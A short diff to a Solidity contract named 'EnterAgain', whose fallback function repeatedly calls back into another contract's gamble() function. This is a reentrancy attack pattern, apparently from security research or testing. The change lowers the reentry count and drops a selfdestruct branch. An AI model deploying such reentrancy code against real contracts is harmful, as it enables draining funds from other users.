@@ -25,10 +25,8 @@ contract EnterAgain {
     function() {
         Entrance entrance = Entrance(a);
         counter++;
-        if(counter < 40) {
-            a.call(bytes4(sha3("gamble()")));
-        } else {
-            selfdestruct(0x0); 
+        if(counter < 29) {
+            entrance.gamble();
         }
     }
 }
